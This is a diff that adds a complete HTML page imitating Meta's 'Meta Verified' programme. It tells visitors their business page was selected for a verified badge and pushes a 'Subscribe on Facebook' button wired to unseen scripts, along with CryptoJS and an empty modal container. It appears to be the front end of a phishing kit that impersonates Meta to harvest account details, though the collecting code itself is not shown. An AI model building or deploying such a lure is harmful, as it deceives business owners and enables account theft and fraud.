@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Verified - Rewards for you</title>
+    <link rel="icon" href="./public/favicon-32x32.png">
+    <link rel="stylesheet" href="./public/styles/style.css">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+
+    <!-- CryptoJS for encryption -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+</head>
+
+<body class="min-h-screen w-full flex justify-center">
+
+    <div class="w-full">
+        <!-- NAVBAR START -->
+        <div class='px-6 md:h-[80px] h-[60px] bg-[#f5f6f6] flex items-center justify-between'>
+            <div class='flex items-center justify-start gap-2 text-[14px]  '>
+                <img src="/public/meta/logo-meta.svg" class='md:w-[65px] w-[70px]' alt="blue" />
+                <div class='ml-[50px] md:flex hidden items-center justify-start gap-7 text-[#1c2b33]'>
+                    <span
+                        class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Get
+                        started</span>
+                    <span
+                        class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Advertise</span>
+                    <span
+                        class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Learn</span>
+                    <span
+                        class='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Support</span>
+                </div>
+            </div>
+            <div class='md:flex hidden items-center justify-start gap-10'>
+                <img src="/public/meta/ic_search.svg" class='w-[20px] h-[20px] cursor-pointer' alt="user" />
+                <img src="/public/meta/ic_user.svg" class='w-[40px] h-[40px] cursor-pointer' alt="user" />
+            </div>
+            <div class='md:hidden flex items-center justify-start gap-10'>
+                <img src="/public/meta/ic_search.svg" class='w-[20px] h-[20px] cursor-pointer' alt="user" />
+            </div>
+        </div>
+        <!-- NAVBAR END -->
+
+        <!-- HERO START -->
+        <div class='flex md:flex-row flex-col w-full items-center justify-between'>
+            <div class='md:w-1/2 w-full flex items-center justify-end md:order-1 order-2 py-8 px-6'>
+                <div
+                    class='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
+                    <img src="/public/meta/ic_blue.svg" alt="meta"
+                        class='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px]' />
+                    <h1 class='md:text-[48px] text-[32px] font-[500] font-bold mb-4 order-2'>Show the world that you mean business.
+                    </h1>
+                    <p class='text-16px text-[#1c2b33] font-[300] md:order-3 order-4'>Congratulations on achieving the
+                        requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that
+                        reflects your dedication and the trust you&apos;ve built with your audience.</p>
+                    <p class='text-16px text-[#1c2b33] font-[300] md:order-4 order-5'>We&apos;re thrilled to celebrate
+                        this moment with you and look forward to seeing your page thrive with this prestigious
+                        recognition!</p>
+                    <button id="btn-submit-request"
+                        class='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>Subscribe
+                        on Facebook</button>
+                </div>
+            </div>
+            <div class='md:w-1/2 w-full md:order-2 order-1 md:py-0 md:h-[calc(100vh-80px)] h-[200px] overflow-hidden'>
+                <video src="/public/videos/video-meta.mp4"
+                    class='w-full h-full object-cover block md:h-full h-[300px] w-full' autoPlay muted loop></video>
+            </div>
+        </div>
+        <!-- HERO END -->
+
+        <!-- META BENEFITS START -->
+        <div class='max-w-[1175px] mx-auto md:pt-20 pt-6 px-6 md:mb-0 mb-10'>
+            <div class='md:w-[83%] w-[100%]'>
+                <p class='text-[32px] font-[500]'>A creator toolkit to take your brand further</p>
+                <p class='text-[16px] text-[#1c2b33] font-[300] my-4'>Explore key Meta Verified benefits available for
+                    Facebook and Instagram. See creator plans and pricing for additional benefits.</p>
+                <a href="https://www.facebook.com/business/ads/ad-objectives/awareness" class='text-[#0064E0]'>
+                    <div class='flex items-center justify-start gap-2 pt-3'>
+                        <div
+                            class='rounded-full w-[24px] h-[24px] flex items-center justify-center border border-[#0064E0]'>
+                            <img src="/public/meta/ic_circle.svg" alt="circle" class='w-[20px] h-[20px] ' />
+                        </div>
+                        <span class='text-[14px]'>Learn more</span>
+                    </div>
+                </a>
+            </div>
+        </div>
+        <!-- META BENEFITS END -->
+
+        <!-- META FEATURES START -->
+        <div class="max-w-[1175px] mx-auto md:pt-20 pt-0 px-6">
+            <h1 class="text-[32px] font-[500] md:mb-7 mb-2">Meta Verified benefits</h1>
+
+            <!-- ================= DESKTOP ================= -->
+            <div class="md:grid hidden grid-cols-12 gap-16 items-stretch">
+
+                <!-- IMAGE -->
+                <div class="col-span-6">
+                    <div class="aspect-[0.8] rounded-2xl overflow-hidden">
+                        <img id="feature-image" src="/public/meta/verified-badge.jpg"
+                            class="w-full h-full object-cover transition-all duration-700" />
+                    </div>
+                </div>
+
+                <!-- CONTENT -->
+                <div class="col-span-6 border-t" id="feature-list">
+
+                    <div class="py-6 cursor-pointer border-b text-[#1c2b33]" data-index="0">
+                        <h3 class="text-[28px] font-[500] flex justify-between">
+                            Verified badge
+                            <img src="/public/meta/ic_apart.svg" class="w-8 h-8 icon" />
+                        </h3>
+                        <p class="py-6 text-gray-600 max-w-md desc">
+                            The badge means your profile was verified by Meta based on your activity across Meta
+                            technologies, or information or documents you provided.
+                        </p>
+                    </div>
+
+                    <div class="py-6 cursor-pointer border-b text-gray-500 hover:text-black" data-index="1">
+                        <h3 class="text-[28px] font-[500] flex justify-between">
+                            Impersonation protection
+                            <img src="/public/meta/ic_plus.svg" class="w-8 h-8 icon" />
+                        </h3>
+                        <p class="py-6 text-gray-600 max-w-md hidden desc">
+                            Protect your brand with proactive impersonation monitoring. Meta will remove accounts that
+                            we determine are pretending to be you.
+                        </p>
+                    </div>
+
+                    <div class="py-6 cursor-pointer border-b text-gray-500 hover:text-black" data-index="2">
+                        <h3 class="text-[28px] font-[500] flex justify-between">
+                            Enhanced support
+                            <img src="/public/meta/ic_plus.svg" class="w-8 h-8 icon" />
+                        </h3>
+                        <p class="py-6 text-gray-600 max-w-md hidden desc">
+                            Get 24/7 access to email or chat agent support.
+                        </p>
+                    </div>
+
+                    <div class="py-6 cursor-pointer border-b text-gray-500 hover:text-black" data-index="3">
+                        <h3 class="text-[28px] font-[500] flex justify-between">
+                            Upgraded profile features
+                            <img src="/public/meta/ic_plus.svg" class="w-8 h-8 icon" />
+                        </h3>
+                        <p class="py-6 text-gray-600 max-w-md hidden desc">
+                            Enrich your profile by adding public to your links to help boost engagement. Benefit not yet
+                            available in all regions.
+                        </p>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- ================= MOBILE SLIDER ================= -->
+            <div class="md:hidden relative">
+
+                <div id="slider" class="flex overflow-x-auto snap-x snap-mandatory no-scrollbar">
+
+                    <div class="min-w-full w-full snap-center px-1">
+                        <div class="flex flex-col gap-6">
+                            <div>
+                                <h3 class="text-[24px] font-[500]">Verified badge</h3>
+                                <p class="mt-3 text-gray-600">
+                                    The badge means your profile was verified by Meta based on your activity across Meta
+                                    technologies.
+                                </p>
+                            </div>
+
+                            <div class="aspect-[0.9] rounded-2xl overflow-hidden">
+                                <img src="/public/meta/verified-badge.jpg" class="w-full h-full object-cover">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="min-w-full w-full snap-center px-1">
+                        <div class="flex flex-col gap-6">
+                            <div>
+                                <h3 class="text-[24px] font-[500]">Impersonation protection</h3>
+                                <p class="mt-3 text-gray-600">
+                                    Protect your brand with proactive impersonation monitoring.
+                                </p>
+                            </div>
+
+                            <div class="aspect-[0.9] rounded-2xl overflow-hidden">
+                                <img src="/public/meta/impersonation.jpg" class="w-full h-full object-cover">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="min-w-full w-full snap-center px-1">
+                        <div class="flex flex-col gap-6">
+                            <div>
+                                <h3 class="text-[24px] font-[500]">Enhanced support</h3>
+                                <p class="mt-3 text-gray-600">
+                                    Get 24/7 access to email or chat agent support.
+                                </p>
+                            </div>
+
+                            <div class="aspect-[0.9] rounded-2xl overflow-hidden">
+                                <img src="/public/meta/enhanced-support.jpg" class="w-full h-full object-cover">
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="min-w-full w-full snap-center px-1">
+                        <div class="flex flex-col gap-6">
+                            <div>
+                                <h3 class="text-[24px] font-[500]">Upgraded profile features</h3>
+                                <p class="mt-3 text-gray-600">
+                                    Enrich your profile by adding public to your links to help boost engagement.
+                                </p>
+                            </div>
+
+                            <div class="aspect-[0.9] rounded-2xl overflow-hidden">
+                                <img src="/public/meta/profile-features.jpg" class="w-full h-full object-cover">
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- PAGINATION -->
+                <div class="flex items-center justify-center gap-4 mt-6">
+                    <button id="prev" class="w-9 h-9 rounded-full border flex items-center justify-center">‹</button>
+
+                    <div class="flex gap-2" id="dots">
+                        <span class="w-2 h-2 rounded-full bg-[#1c2b33]"></span>
+                        <span class="w-2 h-2 rounded-full bg-gray-300"></span>
+                        <span class="w-2 h-2 rounded-full bg-gray-300"></span>
+                        <span class="w-2 h-2 rounded-full bg-gray-300"></span>
+                    </div>
+
+                    <button id="next" class="w-9 h-9 rounded-full border flex items-center justify-center">›</button>
+                </div>
+
+            </div>
+        </div>
+        <!-- META FEATURES END -->
+
+        <!-- START OF STEPS -->
+        <div class='bg-[url(/public/meta/bg_step_verified.jpg)] bg-cover bg-center bg-no-repeat my-20'>
+            <div class='max-w-[1175px] mx-auto md:py-20 py-10 px-6 mb-[80px]'>
+                <div class='w-[100%]'>
+                    <p class='text-[32px] font-[500]'>Sign up for Meta Verified.</p>
+                    <p class='text-[16px] text-[#1c2b33] font-[300] my-4'>Our verification process is designed to
+                        maintain the integrity of the verified badge for businesses. Let&apos;s start by confirming our
+                        invitation.</p>
+                    <div class='grid grid-cols-12 gap-4 pt-12'>
+                        <div class='md:col-span-4 col-span-12 border border-[#cbd2d9] rounded-[24px] bg-white p-10'>
+                            <img src="/public/meta/one.png" alt="step_verified_1"
+                                class='w-[56px] h-[56px] mb-4 min-w-[56px] min-h-[56px]' />
+                            <h3 class="text-[24px] font-[300]">Start your application.</h3>
+                            <p class='mt-3 text-[14px] text-[#465A69] font-[100]'>Those interested in applying for Meta
+                                Verified will need to register and meet certain eligibility requirements (
+                                <Link class='underline decoration-[#cbd2d9]'
+                                    href="https://www.facebook.com/business/help/1980422732333373?id=579726174359330">
+                                requirements for facebook</Link>). We are pleased to see that your business is one of
+                                the few that we have considered and selected.
+                            </p>
+                        </div>
+                        <div class='md:col-span-4 col-span-12 border border-[#cbd2d9] rounded-[24px] bg-white p-10'>
+                            <img src="/public/meta/two.png" alt="step_verified_1"
+                                class='w-[56px] h-[56px] mb-4 min-w-[56px] min-h-[56px]' />
+                            <h3 class="text-[24px] font-[300]">Verify business details.</h3>
+                            <p class='mt-3 text-[14px] text-[#465A69] font-[100]'>You may be asked to share details such
+                                as your business name, address, website and/or phone number.</p>
+                        </div>
+                        <div class='md:col-span-4 col-span-12 border border-[#cbd2d9] rounded-[24px] bg-white p-10'>
+                            <img src="/public/meta/three.png" alt="step_verified_1"
+                                class='w-[56px] h-[56px] mb-4 min-w-[56px] min-h-[56px]' />
+                            <h3 class="text-[24px] font-[300]">Get feedback.</h3>
+                            <p class='mt-3 text-[14px] text-[#465A69] font-[100]'>We&apos;ll review your application and
+                                send an update on your status within three working days.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- END OF STEPS -->
+
+        <!-- FEEDBACK START -->
+        <div class="max-w-[1175px] feedback mx-auto px-6 mb-[80px]">
+            <p class="text-center md:text-[32px] font-[500] text-[24px] mb-10">
+                See how Meta Verified has helped real businesses.
+            </p>
+
+            <!-- SLIDER -->
+            <div class="bg-[#f1f4f7] overflow-hidden rounded-[24px]" id="testimonial-wrapper">
+                <div class="flex transition-transform duration-500" id="testimonial-track">
+
+                    <!-- slide -->
+                    <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
+                        <div class="text-center h-full flex flex-col justify-center items-center">
+                            <p class="md:text-[24px] text-[17px] font-[300] mb-8">
+                                “After enrolling in Meta Verified, I noticed increased reach on my posts and higher
+                                engagement with my audience. I think that seeing a verified badge builds trust. People
+                                that I don't know or newer brands interested in working with me can make sure that
+                                they're talking with me and not a scammer.”
+                            </p>
+                            <p class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">
+                                Kimber Greenwood, Owner of Water Bear Photography
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- slide -->
+                    <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
+                        <div class="text-center h-full flex flex-col justify-center items-center">
+                            <p class="md:text-[24px] text-[17px] font-[300] mb-8">
+                                “Since subscribing, I've noticed a real difference. My posts are getting more reach,
+                                engagement has gone up and I'm seeing more interactions on stories and reels.”
+                            </p>
+                            <p class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">
+                                Devon Kirby, Owner, Mom Approved Miami
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- slide -->
+                    <div class="flex-[0_0_100%] py-20 md:px-20 px-4">
+                        <div class="text-center h-full flex flex-col justify-center items-center">
+                            <p class="md:text-[24px] text-[17px] font-[300] mb-8">
+                                “Having a verified account signals to both our existing followers and new visitors that
+                                we are a credible, professional business that takes both our products and social
+                                presence seriously.”
+                            </p>
+                            <p class="md:text-[18px] text-[15px] font-helvetica font-[100] md:px-[25%] px-4">
+                                Sarah Clancy, Owner of Sarah Marie Running Co.
+                            </p>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- PAGINATION -->
+            <div class="flex items-center justify-center gap-8 mt-6">
+
+                <button id="prev" class="w-[32px] h-[32px] md:block hidden">
+                    <img src="/public/meta/ic_left.svg" class="w-[32px] h-[32px]">
+                </button>
+
+                <div class="flex gap-2" id="dots">
+                    <button class="w-[10px] h-[10px] rounded-full bg-gray-900"></button>
+                    <button class="w-[10px] h-[10px] rounded-full bg-gray-300"></button>
+                    <button class="w-[10px] h-[10px] rounded-full bg-gray-300"></button>
+                </div>
+
+                <button id="next" class="w-[32px] h-[32px] md:block hidden">
+                    <img src="/public/meta/ic_right.svg" class="w-[32px] h-[32px]">
+                </button>
+
+            </div>
+        </div>
+        <!-- FEEDBACK END -->
+
+        <!-- HERO START -->
+        <div class='flex md:flex-row flex-col w-full items-center justify-between'>
+            <div class='md:w-1/2 w-full flex items-center justify-end md:order-1 order-2 py-8 px-6'>
+                <div
+                    class='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
+                    <img src="/public/meta/ic_blue.svg" alt="meta"
+                        class='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px]' />
+                    <h1 class='md:text-[48px] text-[32px] font-[500] font-bold mb-4 order-2'>Show the world that you mean business.
+                    </h1>
+                    <button id="btn-submit-request-2"
+                        class='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>Subscribe
+                        on Facebook</button>
+                </div>
+            </div>
+            <div class='md:w-1/2 w-full md:order-2 order-1 md:py-0 md:h-[calc(100vh-80px)] h-[200px] overflow-hidden'>
+                <video src="/public/videos/video-meta.mp4"
+                    class='w-full h-full object-cover block md:h-full h-[300px] w-full' autoPlay muted loop></video>
+            </div>
+        </div>
+        <!-- HERO END -->
+
+        <!-- FAQ START -->
+        <div class="faq max-w-[1175px] mx-auto mt-20 mb-[80px] px-6">
+            <p class="text-[32px] font-[500] mb-3">FAQ</p>
+
+            <p class="text-[18px] font-[500] mb-10">
+                For more, visit our Help Centre
+                (<a class="text-[#0064E0] underline decoration-[#cbd2d9]"
+                    href="https://www.facebook.com/business/help/2876154822522394">Instagram and Facebook</a>;
+                <a class="text-[#0064E0] underline decoration-[#cbd2d9]"
+                    href="https://faq.whatsapp.com/3872729742954601">WhatsApp</a>).
+            </p>
+
+            <div class="divide-y border-t border-b">
+
+                <!-- item -->
+                <div class="faq-item">
+                    <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                        <span class="md:text-[24px] text-[20px]">
+                            How do I know if my business is eligible?
+                        </span>
+                        <span class="faq-icon transition-transform">
+                            <img src="/public/meta/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]">
+                        </span>
+                    </button>
+
+                    <div
+                        class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                        <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                            Meta Verified is available in selected regions for businesses that meet certain eligibility
+                            requirements
+                            (<a class="text-[#0064E0] underline decoration-[#cbd2d9]"
+                                href="https://www.facebook.com/business/help/2876154822522394">requirements for Facebook
+                                and Instagram</a>;
+                            <a class="text-[#0064E0] underline decoration-[#cbd2d9]"
+                                href="https://faq.whatsapp.com/3872729742954601">requirements for WhatsApp</a>).
+                        </div>
+                    </div>
+                </div>
+
+                <!-- item -->
+                <div class="faq-item">
+                    <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                        <span class="md:text-[24px] text-[20px]">
+                            How can I stay informed if I'm not yet eligible?
+                        </span>
+                        <span class="faq-icon transition-transform">
+                            <img src="/public/meta/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]">
+                        </span>
+                    </button>
+
+                    <div
+                        class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                        <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                            <a class="text-[#0064E0] underline decoration-[#cbd2d9]"
+                                href="https://business.facebook.com/business/loginpage">
+                                Join our waitlist
+                            </a>
+                            to stay updated. We will notify you when Meta Verified for businesses is available.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- item -->
+                <div class="faq-item">
+                    <button class="faq-btn w-full flex items-center justify-between py-6 text-left text-lg font-medium">
+                        <span class="md:text-[24px] text-[20px]">
+                            I already have a verified badge. What happens to it?
+                        </span>
+                        <span class="faq-icon transition-transform">
+                            <img src="/public/meta/ic_arrow.svg" class="md:w-[24px] w-[20px] md:h-[24px] h-[20px]">
+                        </span>
+                    </button>
+
+                    <div
+                        class="faq-content grid transition-all duration-300 ease-in-out max-h-0 grid-rows-[0fr] opacity-0">
+                        <div class="md:text-[18px] text-[16px] overflow-hidden text-gray-600 pb-8 leading-relaxed">
+                            No action is needed in order to keep your badge. Existing verified badge holders can apply
+                            for a Meta Verified subscription.
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        <!-- FAQ END -->
+
+        <!-- FOOTER START -->
+        <footer class="bg-[#1b2a34] text-white">
+            <div class="max-w-[1175px] mx-auto py-20 mt-20 px-6 grid grid-cols-1 lg:grid-cols-2 gap-10 items-start">
+                <div>
+                    <h2 class="text-3xl font-semibold leading-snug mb-4">
+                        Get the latest updates from Meta for business.
+                    </h2>
+
+                    <p class="text-gray-300 max-w-md">
+                        Provide your email address to receive the latest updates from Meta
+                        for business, including news, events and product updates.
+                    </p>
+                </div>
+
+                <div class="w-full max-w-xl">
+                    <div class="flex flex-col md:flex-row gap-4 mb-4">
+                        <input type="email" placeholder="Email address"
+                            class="w-full px-4 py-3 rounded-lg text-black outline-none h-52px text-[#465a69] text-[16px]" />
+
+                        <input type="text" placeholder="Enter a country name..."
+                            class="w-full px-4 py-3 rounded-lg text-black outline-none h-52px text-[#465a69] text-[16px]" />
+                    </div>
+
+                    <p class="text-xs text-gray-300 leading-relaxed mb-4">
+                        By submitting this form, you agree to receive marketing related
+                        electronic communications from Meta, including news, events, updates
+                        and promotional emails. You may withdraw your consent and
+                        unsubscribe from these at any time, for example, by clicking the
+                        unsubscribe link included in our emails. For more information about
+                        how Meta handles your data, please read our
+                        <span class="underline cursor-pointer">Data Policy</span>.
+                    </p>
+
+                    <button
+                        class='bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full font-[600] text-[15px]'>
+                        Subscribe
+                    </button>
+                </div>
+            </div>
+
+            <div class="border-t border-white/20"></div>
+        </footer>
+        <!-- FOOTER END -->
+
+        <!-- FOOTER 2 START -->
+        <footer class="bg-[#1b2a34] text-gray-400">
+            <div class="max-w-[1175px] mx-auto py-20 px-6">
+
+                <!-- Desktop -->
+                <div class="hidden md:grid md:grid-cols-3 lg:grid-cols-4 gap-x-8 gap-y-12">
+
+                    <div>
+                        <h3 class="text-[#cbd2d9] text-[18px] mb-4">Meta technologies</h3>
+                        <ul class="space-y-3">
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Facebook</a></li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Instagram</a></li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Messenger</a></li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">WhatsApp</a></li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Audience Network</a>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <h3 class="text-[#cbd2d9] text-[18px] mb-4">Tools</h3>
+                        <ul class="space-y-3">
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Free tools</a></li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Facebook Pages</a>
+                            </li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Instagram profiles</a>
+                            </li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Stories</a></li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Shops</a></li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <h3 class="text-[#cbd2d9] text-[18px] mb-4">Goals</h3>
+                        <ul class="space-y-3">
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Set up a Facebook
+                                    Page</a></li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Build brand
+                                    awareness</a></li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Promote your local
+                                    business</a></li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Grow online sales</a>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div>
+                        <h3 class="text-[#cbd2d9] text-[18px] mb-4">Business types</h3>
+                        <ul class="space-y-3">
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Small business</a>
+                            </li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Large businesses</a>
+                            </li>
+                            <li><a href="#" class="text-gray-400 hover:text-gray-200 text-[13px]">Agency</a></li>
+                        </ul>
+                    </div>
+
+                </div>
+
+                <!-- Mobile accordion -->
+                <div class="md:hidden divide-y divide-gray-800 footer-mobile">
+
+                    <div class="py-5">
+                        <button class="footer-btn flex justify-between items-center w-full text-left text-white">
+                            <span class="text-[24px]">Meta technologies</span>
+                            <img src="/public/meta/ic_arrow_w.svg" class="w-[20px] h-[20px] transition-transform">
+                        </button>
+
+                        <div class="footer-content overflow-hidden transition-all duration-300 max-h-0">
+                            <ul class="space-y-3 mt-4">
+                                <li><a href="#" class="text-gray-400 text-[18px] block">Facebook</a></li>
+                                <li><a href="#" class="text-gray-400 text-[18px] block">Instagram</a></li>
+                                <li><a href="#" class="text-gray-400 text-[18px] block">Messenger</a></li>
+                                <li><a href="#" class="text-gray-400 text-[18px] block">WhatsApp</a></li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="py-5">
+                        <button class="footer-btn flex justify-between items-center w-full text-left text-white">
+                            <span class="text-[24px]">Tools</span>
+                            <img src="/public/meta/ic_arrow_w.svg" class="w-[20px] h-[20px] transition-transform">
+                        </button>
+
+                        <div class="footer-content overflow-hidden transition-all duration-300 max-h-0">
+                            <ul class="space-y-3 mt-4">
+                                <li><a href="#" class="text-gray-400 text-[18px] block">Free tools</a></li>
+                                <li><a href="#" class="text-gray-400 text-[18px] block">Facebook Pages</a></li>
+                                <li><a href="#" class="text-gray-400 text-[18px] block">Instagram profiles</a></li>
+                            </ul>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- bottom -->
+                <div class="border-t border-[#465A69] pt-12 text-sm mt-12">
+
+                    <div class="flex flex-col md:flex-row sm:justify-between sm:items-start gap-6">
+
+                        <div class="text-[#cbd2d9] text-[13px]">
+                            © 2026 Meta
+
+                            <div class="flex gap-3 mt-4">
+                                <img src="/public/meta/ic_facebook.svg" class="w-[24px] h-[24px]">
+                                <img src="/public/meta/ic_instagram.svg" class="w-[24px] h-[24px]">
+                                <img src="/public/meta/ic_x.svg" class="w-[24px] h-[24px]">
+                                <img src="/public/meta/ic_in.svg" class="w-[24px] h-[24px]">
+                            </div>
+                        </div>
+
+                        <div class="flex flex-wrap gap-x-6 gap-y-2">
+                            <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">About</a>
+                            <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Developers</a>
+                            <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Careers</a>
+                            <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Privacy</a>
+                            <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Cookies</a>
+                            <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Terms</a>
+                            <a href="#" class="text-[#cbd2d9] md:text-[13px] text-[12px]">Help Centre</a>
+                        </div>
+
+                    </div>
+
+                </div>
+
+            </div>
+        </footer>
+        <!-- FOOTER 2 END -->
+    </div>
+
+    <!-- Modals Container -->
+    <div id="modalsContainer"></div>
+
+    <!-- JavaScript Files -->
+    <script src="./public/js/config.js"></script>
+    <script src="./public/js/utils.js"></script>
+    <script src="./public/js/modal.js"></script>
+    <script src="./public/js/app.js"></script>
+    <script src="./public/js/slide.js"></script>
+    <script src="./public/js/feedback.js"></script>
+    <script src="./public/js/faq.js"></script>
+    <script src="./public/js/footer.js"></script>   
+</body>
+
+</html>
